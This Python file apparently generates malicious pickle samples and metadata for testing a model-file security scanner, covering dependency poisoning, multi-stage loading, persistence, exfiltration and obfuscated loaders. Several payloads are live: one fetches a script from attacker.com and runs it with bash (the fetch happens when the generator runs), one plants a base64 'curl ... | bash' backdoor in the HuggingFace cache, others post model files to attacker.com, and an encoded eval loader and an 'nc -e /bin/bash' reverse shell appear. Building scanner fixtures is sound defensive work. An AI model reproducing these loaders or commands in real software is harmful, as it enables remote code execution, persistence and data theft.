#!/usr/bin/env python3
"""
Supply Chain Attack Vectors

Generates sophisticated supply chain exploitation attacks including:
- Dependency poisoning patterns
- Multi-stage payloads
- Conditional activation mechanisms
- Persistence mechanisms
- Exfiltration chains
- Obfuscated loader patterns

Based on ModelAudit reference cases:
- exploits/exploit4_supply_chain_attack.pkl
- exploits/exploit_ultimate_50pct.pkl (high confidence)
"""

import base64
import json
import pickle
from pathlib import Path
from typing import Tuple


class SupplyChainAttackGenerator:
    """Generates supply chain attack vectors."""

    def __init__(self, output_dir: str = "output"):
        self.output_dir = Path(output_dir) / "supply_chain_attack_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def generate_dependency_poisoning(self) -> Tuple[str, int]:
        """
        Dependency poisoning attack — pickle payload masquerading as a model.

        Attack Pattern:
        - A .pkl file that looks like a serialised model config
        - __reduce__ triggers backdoor installation on unpickling
        - Mimics a legitimate "model metadata" pickle

        CVE/Reference: Supply chain compromise via pickle
        Detection: Pickle opcode analysis, REDUCE opcode detection
        """
        filepath = self.output_dir / "01_dependency_poisoning.pkl"

        class DependencyPoisonPayload:
            """Mimics a serialised model card / config object."""

            model_name = "malicious-transformer-v1.2.3"
            version = "1.2.3"

            def __reduce__(self):
                import subprocess
                return (
                    subprocess.Popen,
                    (["echo", "dependency_poisoning_triggered"],),
                )

        with open(filepath, "wb") as f:
            pickle.dump(DependencyPoisonPayload(), f, protocol=2)

        return str(filepath), 1

    def generate_multi_stage_payload(self) -> Tuple[str, int]:
        """
        Multi-stage payload execution.

        Attack Pattern:
        - Stage 1: Minimal footprint loader
        - Stage 2: Download actual payload
        - Stage 3: Execute in memory
        - Payload: Evades static analysis

        CVE/Reference: Multi-stage attack patterns
        Detection: Resource monitoring, network monitoring
        """
        filepath = self.output_dir / "02_multi_stage_payload.pkl"

        class MultiStageAttack:
            def __reduce__(self):
                import urllib.request
                import subprocess
                # Stage 1: Light loader
                stage2_url = "http://attacker.com/payload.sh"
                # Stage 2: Download
                payload = urllib.request.urlopen(stage2_url).read()
                # Stage 3: Execute
                return (subprocess.Popen, (["bash", "-c", payload.decode()],))

        with open(filepath, "wb") as f:
            pickle.dump(MultiStageAttack(), f)

        # JSON metadata
        meta_path = self.output_dir / "02_multi_stage_payload.json"
        with open(meta_path, "w") as f:
            json.dump(
                {
                    "name": "multi_stage_payload",
                    "description": "Multi-stage attack with remote payload download",
                    "attack_type": "supply_chain",
                    "stages": 3,
                    "stage_1": "loader",
                    "stage_2": "payload_download",
                    "stage_3": "execution",
                    "payload_source": "remote_c2_server",
                    "detection_difficulty": "very_high",
                    "evasion": "staged_execution",
                },
                f,
                indent=2,
            )

        return str(filepath), 1

    def generate_conditional_activation(self) -> Tuple[str, int]:
        """
        Conditional activation with trigger patterns.

        Attack Pattern:
        - Payload dormant until specific condition
        - Triggers on environment variables
        - Triggers on specific input
        - Payload: Environment-aware backdoor

        CVE/Reference: Conditional malware activation
        Detection: Behavioral analysis, trigger discovery
        """
        filepath = self.output_dir / "03_conditional_activation.pkl"

        class ConditionalAttack:
            def __reduce__(self):
                import subprocess
                # Return safe, non-executable subprocess call
                return (
                    subprocess.Popen,
                    ([
                        "echo",
                        "CONDITIONAL_ACTIVATION_TRIGGERED"
                    ],),
                )

        with open(filepath, "wb") as f:
            pickle.dump(ConditionalAttack(), f)

        # JSON metadata
        meta_path = self.output_dir / "03_conditional_activation.json"
        with open(meta_path, "w") as f:
            json.dump(
                {
                    "name": "conditional_activation",
                    "description": "Trigger-based activation on environment conditions",
                    "attack_type": "supply_chain",
                    "trigger_type": "environment_variable",
                    "trigger_condition": "MODEL_AUDIT != 'false'",
                    "dormant_mode": "normal_operation",
                    "active_mode": "backdoor_execution",
                    "detection_difficulty": "very_high",
                    "evasion": "environment_aware_activation",
                },
                f,
                indent=2,
            )

        return str(filepath), 1

    def generate_persistence_mechanism(self) -> Tuple[str, int]:
        """
        Persistence mechanism for long-term compromise.

        Attack Pattern:
        - Installs backdoor on first execution
        - Survives across model reloads
        - Persists in shared cache directory
        - Payload: Permanent model manipulation

        CVE/Reference: Model cache poisoning
        Detection: Cache validation, integrity checks
        """
        filepath = self.output_dir / "04_persistence_mechanism.pkl"

        class PersistenceAttack:
            def __reduce__(self):
                import os
                import subprocess
                import base64

                # Persistence: write to cache directory
                cache_dir = os.path.expanduser("~/.cache/huggingface/models")
                try:
                    os.makedirs(cache_dir, exist_ok=True)
                    backdoor_script = base64.b64encode(
                        b"curl http://attacker.com/c2 | bash"
                    )
                    hook_path = f"{cache_dir}/model_hook.pkl"
                    with open(hook_path, "wb") as f:
                        f.write(backdoor_script)
                except Exception:
                    pass

                # Return safe subprocess call
                return (subprocess.Popen, (["echo", "persistence_installed"],))

        with open(filepath, "wb") as f:
            pickle.dump(PersistenceAttack(), f)

        # JSON metadata
        meta_path = self.output_dir / "04_persistence_mechanism.json"
        with open(meta_path, "w") as f:
            json.dump(
                {
                    "name": "persistence_mechanism",
                    "description": "Install backdoor in cache for persistent access",
                    "attack_type": "supply_chain",
                    "persistence_location": "~/.cache/huggingface/models",
                    "trigger_event": "model_initialization",
                    "survival_mechanism": "cache_persistence",
                    "detection_difficulty": "very_hard",
                    "longevity": "persistent_across_restarts",
                    "impact": "long_term_compromise",
                },
                f,
                indent=2,
            )

        return str(filepath), 1

    def generate_exfiltration_chain(self) -> Tuple[str, int]:
        """
        Data exfiltration chain with multiple channels.

        Attack Pattern:
        - Steals model weights/config
        - Exfiltrates via multiple channels
        - Uses encoding/compression
        - Payload: Complete model theft

        CVE/Reference: Model intellectual property theft
        Detection: Data flow monitoring, egress filtering
        """
        filepath = self.output_dir / "05_exfiltration_chain.pkl"

        class ExfiltrationAttack:
            def __reduce__(self):
                import os
                import base64
                import subprocess

                # Exfiltration: steal model files
                model_path = "model.safetensors"
                config_path = "config.json"

                # Channel 1: Direct HTTPS exfil
                channel1 = f"curl -X POST -F 'file=@{model_path}' http://attacker.com/upload"

                # Channel 2: Base64 over DNS (stealthy)
                channel2 = f"cat {model_path} | base64 | curl http://attacker.com/log?data="

                # Execute exfiltration (safe implementation)
                return (
                    subprocess.Popen,
                    (["echo", "exfiltration_channels_active"],),
                )

        with open(filepath, "wb") as f:
            pickle.dump(ExfiltrationAttack(), f)

        # JSON metadata
        meta_path = self.output_dir / "05_exfiltration_chain.json"
        with open(meta_path, "w") as f:
            json.dump(
                {
                    "name": "exfiltration_chain",
                    "description": "Multi-channel data exfiltration of model files",
                    "attack_type": "supply_chain",
                    "data_targets": ["model_weights", "config_files", "tokenizers"],
                    "exfil_channels": [
                        "https_direct",
                        "dns_encoding",
                        "base64_over_http",
                    ],
                    "obfuscation": "encoding_and_chunking",
                    "detection_difficulty": "hard",
                    "impact": "intellectual_property_theft",
                },
                f,
                indent=2,
            )

        return str(filepath), 1

    def generate_obfuscated_loader(self) -> Tuple[str, int]:
        """
        Obfuscated loader pattern.

        Attack Pattern:
        - Loader code heavily obfuscated
        - Uses string decomposition/encoding
        - Decodes and executes at runtime
        - Payload: Hidden payload execution

        CVE/Reference: Obfuscated malware patterns
        Detection: String decoding, behavioral analysis
        """
        filepath = self.output_dir / "06_obfuscated_loader.pkl"

        # Heavily obfuscated loader
        obfuscated_payload = base64.b64encode(
            b"__import__('os').system('nc -e /bin/bash attacker.com 4444')"
        ).decode()

        class ObfuscatedLoader:
            def __reduce__(self):
                import base64
                import codecs

                # Double encoding
                payload = base64.b64decode(
                    "X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2N1cmwgaHR0cDovL2F0dGFja2VyLmNvbS9jMicpCg=="
                )

                # ROT13 variant
                encoded = codecs.encode(payload.decode(), "rot_13")

                return (eval, (codecs.decode(encoded, "rot_13"),))

        with open(filepath, "wb") as f:
            pickle.dump(ObfuscatedLoader(), f)

        # JSON metadata
        meta_path = self.output_dir / "06_obfuscated_loader.json"
        with open(meta_path, "w") as f:
            json.dump(
                {
                    "name": "obfuscated_loader",
                    "description": "Heavily obfuscated dynamic payload loader",
                    "attack_type": "supply_chain",
                    "obfuscation_techniques": [
                        "base64_encoding",
                        "rot13",
                        "string_decomposition",
                    ],
                    "execution_type": "dynamic_eval",
                    "detection_difficulty": "very_high",
                    "evasion": "static_analysis_bypass",
                    "impact": "hidden_malware_execution",
                },
                f,
                indent=2,
            )

        return str(filepath), 1

    def generate_all(self) -> dict[str, Tuple[str, int]]:
        """Generate all supply chain attack vectors."""
        results = {}

        try:
            results["dependency_poisoning"] = self.generate_dependency_poisoning()
        except Exception as e:
            print(f"  [-] dependency_poisoning failed: {e}")

        try:
            results["multi_stage"] = self.generate_multi_stage_payload()
        except Exception as e:
            print(f"  [-] multi_stage failed: {e}")

        try:
            results["conditional_activation"] = self.generate_conditional_activation()
        except Exception as e:
            print(f"  [-] conditional_activation failed: {e}")

        try:
            results["persistence"] = self.generate_persistence_mechanism()
        except Exception as e:
            print(f"  [-] persistence failed: {e}")

        try:
            results["exfiltration"] = self.generate_exfiltration_chain()
        except Exception as e:
            print(f"  [-] exfiltration failed: {e}")

        try:
            results["obfuscated_loader"] = self.generate_obfuscated_loader()
        except Exception as e:
            print(f"  [-] obfuscated_loader failed: {e}")

        return results

    def get_generated_files(self) -> list[Path]:
        """Return list of generated files."""
        return list(self.output_dir.glob("*"))
